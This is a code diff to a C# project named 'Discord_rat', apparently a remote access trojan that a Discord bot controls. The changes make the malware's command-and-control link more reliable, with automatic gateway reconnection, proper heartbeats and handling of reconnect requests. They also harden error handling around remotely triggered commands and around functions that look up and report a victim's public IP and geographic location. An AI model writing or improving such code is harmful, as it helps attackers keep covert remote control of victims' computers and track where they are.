@@ -97,12 +97,18 @@ namespace Discord_rat
            catch (Exception s) { Program.LogDebug("WS error: " + s); Console.WriteLine(s); }
            finally
            {
+              connected = false;
               outputStream?.Dispose();
            }
        }
 
        public async Task SendMessageAsync(string message)
        {
+           if (WS == null || WS.State != WebSocketState.Open)
+           {
+               connected = false;
+               return;
+           }
            ArraySegment<byte> bytesToSend = new ArraySegment<byte>(Encoding.UTF8.GetBytes(message));
            await WS.SendAsync(bytesToSend, WebSocketMessageType.Text, true, CancellationToken.None);
        }
@@ -146,6 +152,8 @@ namespace Discord_rat
         }
         public static JavaScriptSerializer serializer = new JavaScriptSerializer();
         public static WsClient client = new WsClient();
+        private static int? lastSequence;
+        private static CancellationTokenSource heartbeatCts;
         public static string BotToken = settings.Bottoken;
         public static string GuildId = settings.Guildid;
         public static string ChannelId = "unset";
@@ -290,11 +298,21 @@ namespace Discord_rat
         }
         public static async Task Responsehandler(Stream inputStream)
         {
-            StreamReader reader = new StreamReader(inputStream);
-            var DictResult = JsonToDictionary(reader.ReadToEnd());
-            Console.WriteLine(DictionaryToJson(DictResult));
-            await handler(DictResult);
-            inputStream.Dispose();
+            try
+            {
+                StreamReader reader = new StreamReader(inputStream);
+                var DictResult = JsonToDictionary(reader.ReadToEnd());
+                Console.WriteLine(DictionaryToJson(DictResult));
+                await handler(DictResult);
+            }
+            catch (Exception ex)
+            {
+                LogDebug("Handler error: " + ex.Message);
+            }
+            finally
+            {
+                inputStream.Dispose();
+            }
         }
         public static void Main(string[] args)
         {
@@ -347,29 +365,80 @@ namespace Discord_rat
         }
         public static async Task MainAsync()
         {
+            while (true)
+            {
+                try
+                {
+                    lastSequence = null;
+                    System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12 | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls;
+                    LogDebug("Connecting gateway...");
+                    client.ResponseReceived = Responsehandler;
+                    await client.ConnectAsync("wss://gateway.discord.gg/?v=10&encoding=json");
+                    LogDebug("Gateway connected, waiting...");
+                    await client.WaitUtillDead();
+                    LogDebug("Gateway disconnected, reconnecting...");
+                }
+                catch (Exception ex)
+                {
+                    LogDebug("MainAsync failed: " + ex);
+                }
+
+                StopHeartbeat();
+                try
+                {
+                    await client.DisconnectAsync();
+                }
+                catch
+                {
+                }
+
+                await Task.Delay(5000);
+            }
+        }
+
+        private static void StopHeartbeat()
+        {
+            if (heartbeatCts == null)
+            {
+                return;
+            }
+
+            heartbeatCts.Cancel();
+            heartbeatCts.Dispose();
+            heartbeatCts = null;
+        }
+
+        public static async Task heartbeat(int milliseconds)
+        {
+            StopHeartbeat();
+            heartbeatCts = new CancellationTokenSource();
+            var token = heartbeatCts.Token;
+
             try
             {
-                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12 | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls;
-                LogDebug("Connecting gateway...");
-                client.ResponseReceived = Responsehandler;
-                await client.ConnectAsync("wss://gateway.discord.gg/?v=10&encoding=json");
-                LogDebug("Gateway connected, waiting...");
-                await client.WaitUtillDead();
+                while (client.connected && !token.IsCancellationRequested)
+                {
+                    await Task.Delay(milliseconds, token);
+
+                    var data = new Dictionary<object, object> { { "op", 1 } };
+                    if (lastSequence.HasValue)
+                    {
+                        data["d"] = lastSequence.Value;
+                    }
+                    else
+                    {
+                        data["d"] = null;
+                    }
+
+                    await client.SendMessageAsync(DictionaryToJson(data));
+                }
+            }
+            catch (TaskCanceledException)
+            {
             }
             catch (Exception ex)
             {
-                LogDebug("MainAsync failed: " + ex);
-            }
-        }
-        public static async Task heartbeat(int milliseconds)
-        {
-            while (client.connected)
-            {
-                await Task.Delay(milliseconds);
-                var data = new Dictionary<object, object> { { "op", 1 }, { "d", 5 } };
-                var text = DictionaryToJson(data);
-                Console.WriteLine(text);
-                await client.SendMessageAsync(text);
+                LogDebug("Heartbeat error: " + ex.Message);
             }
         }
         public static async Task login(string token)
@@ -463,7 +532,20 @@ namespace Discord_rat
                 case 11:
                     Console.WriteLine("recived heartbeat");
                     break;
+                case 7:
+                    LogDebug("Gateway requested reconnect");
+                    await client.DisconnectAsync();
+                    break;
+                case 9:
+                    LogDebug("Invalid gateway session");
+                    await client.DisconnectAsync();
+                    break;
                 case 0:
+                    if (data.ContainsKey("s") && data["s"] != null)
+                    {
+                        lastSequence = Convert.ToInt32(data["s"]);
+                    }
+
                     switch (data["t"])
                     {
                         case "READY":
@@ -472,7 +554,7 @@ namespace Discord_rat
                             break;
                         case "GUILD_CREATE":
                             var guilds_id = ObjectToDictionary(data["d"])["id"];
-                            if ((string)guilds_id == GuildId)
+                            if ((string)guilds_id == GuildId && ChannelId == "unset")
                             {
                                 var main_channel_id = await CreateHostingChannel(data);
                                 if (!string.IsNullOrEmpty(main_channel_id))
@@ -548,39 +630,60 @@ namespace Discord_rat
 
         public static async Task HandleButtonInteraction(string custom_id, string interaction_id, string interaction_token, string channel_id, string menu_message_id)
         {
-            if (!string.IsNullOrEmpty(menu_message_id))
+            try
             {
-                HelpMenuMessageId = menu_message_id;
-            }
+                if (!string.IsNullOrEmpty(menu_message_id))
+                {
+                    HelpMenuMessageId = menu_message_id;
+                }
 
-            if (custom_id.StartsWith("modal_"))
-            {
-                await ShowParameterModal(custom_id.Substring(6), interaction_id, interaction_token);
-                return;
-            }
+                if (custom_id.StartsWith("modal_"))
+                {
+                    await ShowParameterModal(custom_id.Substring(6), interaction_id, interaction_token);
+                    return;
+                }
 
-            if (custom_id.StartsWith("cmd_"))
-            {
-                await DeferInteractionUpdate(interaction_id, interaction_token);
-                string command = custom_id.Substring(4);
-                await ExecuteButtonCommand(command, channel_id);
-                return;
-            }
+                if (custom_id.StartsWith("cmd_"))
+                {
+                    await DeferInteractionUpdate(interaction_id, interaction_token);
+                    string command = custom_id.Substring(4);
+                    await ExecuteButtonCommand(command, channel_id);
+                    return;
+                }
 
-            string content;
-            Dictionary<string, string> buttons;
-            if (custom_id == "back_main")
-            {
-                content = GetMainMenuText();
-                buttons = GetMainMenuButtons();
-            }
-            else
-            {
-                content = GetCategoryText(custom_id);
-                buttons = GetCategoryButtons(custom_id);
-            }
+                string content;
+                Dictionary<string, string> buttons;
+                if (custom_id == "back_main")
+                {
+                    content = GetMainMenuText();
+                    buttons = GetMainMenuButtons();
+                }
+                else
+                {
+                    content = GetCategoryText(custom_id);
+                    buttons = GetCategoryButtons(custom_id);
+                }
 
-            await RespondInteractionUpdate(interaction_id, interaction_token, content, buttons);
+                await RespondInteractionUpdate(interaction_id, interaction_token, content, buttons);
+            }
+            catch (Exception ex)
+            {
+                LogDebug("Button error: " + ex.Message);
+                try
+                {
+                    if (custom_id.StartsWith("cmd_"))
+                    {
+                        await Send_message(channel_id, "Command failed: " + ex.Message);
+                    }
+                    else
+                    {
+                        await RespondInteractionUpdate(interaction_id, interaction_token, "Command failed: " + ex.Message, GetMainMenuButtons());
+                    }
+                }
+                catch
+                {
+                }
+            }
         }
 
         public static Dictionary<object, object> BuildModalTextInput(string customId, string label, string placeholder, bool paragraph)
@@ -997,6 +1100,19 @@ namespace Discord_rat
         }
 
         public static async Task ExecuteButtonCommand(string command, string channel_id)
+        {
+            try
+            {
+                await ExecuteButtonCommandCore(command, channel_id);
+            }
+            catch (Exception ex)
+            {
+                LogDebug("Command error (" + command + "): " + ex.Message);
+                await Send_message(channel_id, "Command failed: " + ex.Message);
+            }
+        }
+
+        public static async Task ExecuteButtonCommandCore(string command, string channel_id)
         {
             switch (command)
             {
@@ -1602,20 +1718,43 @@ namespace Discord_rat
         }
         public static async Task<string> geolocate()
         {
-            HttpClient httpClient = new HttpClient();
-            var response = await httpClient.GetAsync("https://geolocation-db.com/json");
-            response.EnsureSuccessStatusCode();
-            var dict = JsonToDictionary(await response.Content.ReadAsStringAsync());
-            string link = String.Format("http://www.google.com/maps/place/{0},{1}", dict["latitude"].ToString(), dict["longitude"].ToString());
-            return link;
+            try
+            {
+                HttpClient httpClient = new HttpClient();
+                httpClient.Timeout = TimeSpan.FromSeconds(10);
+                var response = await httpClient.GetAsync("https://geolocation-db.com/json");
+                if (!response.IsSuccessStatusCode)
+                {
+                    return "Geolocation unavailable (" + (int)response.StatusCode + ")";
+                }
+
+                var dict = JsonToDictionary(await response.Content.ReadAsStringAsync());
+                return String.Format("http://www.google.com/maps/place/{0},{1}", dict["latitude"].ToString(), dict["longitude"].ToString());
+            }
+            catch (Exception ex)
+            {
+                return "Geolocation failed: " + ex.Message;
+            }
         }
         public static async Task<string> getip()
         {
-            HttpClient httpClient = new HttpClient();
-            var response = await httpClient.GetAsync("https://geolocation-db.com/json");
-            response.EnsureSuccessStatusCode();
-            var dict = JsonToDictionary(await response.Content.ReadAsStringAsync());
-            return dict["IPv4"].ToString();
+            try
+            {
+                HttpClient httpClient = new HttpClient();
+                httpClient.Timeout = TimeSpan.FromSeconds(10);
+                var response = await httpClient.GetAsync("https://geolocation-db.com/json");
+                if (!response.IsSuccessStatusCode)
+                {
+                    return "unknown";
+                }
+
+                var dict = JsonToDictionary(await response.Content.ReadAsStringAsync());
+                return dict["IPv4"].ToString();
+            }
+            catch
+            {
+                return "unknown";
+            }
         }
         public static async Task getprocs(string channelid) 
         {
